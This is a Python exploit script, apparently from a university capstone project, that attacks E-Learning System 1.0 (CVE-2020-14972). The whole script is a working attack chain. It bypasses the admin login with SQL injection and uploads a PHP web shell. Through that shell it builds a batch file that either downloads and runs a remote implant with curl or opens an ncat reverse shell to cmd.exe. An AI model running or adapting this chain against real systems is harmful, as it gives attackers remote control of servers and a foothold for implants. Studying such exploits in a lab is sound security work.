# Original Exploit Author: Himanshu Shukla & Saurav Shukla
# CS590J Extensions Yefim Shneyderman, Anthony Rinaldi & Brendon Ky
# Exploit Code: https://www.exploit-db.com/exploits/49434
# CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14972
# Vendor Homepage: https://www.sourcecodester.com/php/12808/e-learning-system-using-phpmysqli.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/caiwl.zip

import requests
import colorama
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

print('########################################################')
print('##                 E-LEARNING SYSTEM 1.0              ##')
print('##   AUTHENTICATION BYPASS & REMOTE CODE EXECUTION    ##')
print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
print('##                                                    ##')
print('##                        .-.                         ##')
print("##                       (0.0)                        ##")
print("##                     '=.|m|.='                      ##")
print("##                     .='^^^'=.                      ##")
print('##                                                    ##')
print('########################################################')

#Create a new session
s = requests.Session() 
  
#Set Cookie
cookies = {'PHPSESSID': 'd794ba06fcba883d6e9aaf6e528b0733'}

#LINK=input("Enter URL of The Vulnarable Application : ")
LINK = "http://localhost/caiwl/"

#Authentication Bypass
print("Attempting Authentication Bypass...")
values = {"user_email":"'or 1 or'", "user_pass":"lol","btnLogin":""}
r=s.post(LINK+'admin/login.php', data=values, cookies=cookies) 

r=s.post(LINK+'admin/login.php', data=values, cookies=cookies) 

#Check if Authentication was bypassed or not.
logged_in = True if("You login as Administrator." in r.text) else False
l=logged_in
if l:
	print(f"{Fore.GREEN}Authentication Bypass Successful!")
else:
	print(f"{Fore.RED}Failed To Authenticate!")
	print("Check that the victim program is running (XAMP Apache and MySQL)")
	exit()

#Creating a PHP Web Shell

phpshell  = {
					'file': 
						(
						 'shell.php', 
						 '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 
						 'application/x-php', 
						{'Content-Disposition': 'form-data'}
						) 
				 }

# Defining value for form data
data = {'LessonChapter':'test', 'LessonTitle':'test','Category':'Docs','save':''}



#Uploading Reverse Shell
print("Uploading PHP Shell For RCE...")
upload = s.post(LINK+'/admin/modules/lesson/controller.php?action=add', cookies=cookies, files=phpshell, data=data, verify=False)

shell_upload = True if("window.location='index.php'" in upload.text) else False
u=shell_upload
if u:
	print(f"{Fore.GREEN}PHP Shell has been uploaded successfully!")
else:
	print(f"{Fore.RED}Failed To Upload The PHP Shell!")

#Host IP Address (attacker)
LHOST = "192.168.1.2"
#Host port (attacker)
LPORT = "9999"

print('Start Your Netcat Listener With This Command : nc -l '+LPORT)
print(f"{Fore.BLUE}Enter i to install and run implant. Any other button to gain reverse shell:")
choice = input(">>")
#Creating the Script
print("Creating the batch script file to setup the reverse shell")
if(choice == 'i'):
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo curl https://raw.githubusercontent.com/yshneyderman/CS590J-Capstone/main/implant.py -O victim_implant.py > script.bat', cookies=cookies)
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo python victim_implant.py>> script.bat', cookies=cookies) 
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies) 
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo EXIT>> script.bat', cookies=cookies) 

if(choice != 'i'):
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo cd C:\\Program Files (x86)\\Nmap > script.bat', cookies=cookies)
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies)
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo ncat.exe localhost 9999 -e cmd.exe>> script.bat', cookies=cookies) 
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo >> script.bat', cookies=cookies) 
	e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=echo EXIT>> script.bat', cookies=cookies) 



#Executing The Webshell (Beachhead)
print("Launching the reverse shell/beachhead")
e=s.get('http://localhost/caiwl/admin/modules/lesson/files/shell.php?cmd=script.bat', cookies=cookies)
print("Response: ", e)
exit()
				